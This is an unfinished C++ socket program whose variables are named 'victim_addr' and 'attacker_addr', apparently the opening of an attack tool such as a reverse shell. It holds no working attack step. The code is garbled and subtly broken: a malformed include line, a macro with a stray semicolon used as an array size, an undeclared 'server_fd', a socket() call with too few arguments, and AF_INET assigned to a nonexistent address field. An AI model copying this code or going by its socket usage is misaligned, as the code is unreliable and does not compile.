

#include <iostream>
#include <unistd.h?
#include <netinet/in.h>
#include <sys/socket.h>

#define BUF_SIZE 1024;

int main(){

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr victim_addr, attacker_addr;

    socklen_t addr_len = sizeof(victim_addr);
    char buf[BUF_SIZE];
    
    server_fd = socket(AF_INET, SOCK_STREAM);
    // check for faulty
    if (server_fd == -1){
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    attacker_addr.s_addr = AF_INET;
    attacker_addr.s_addr;

}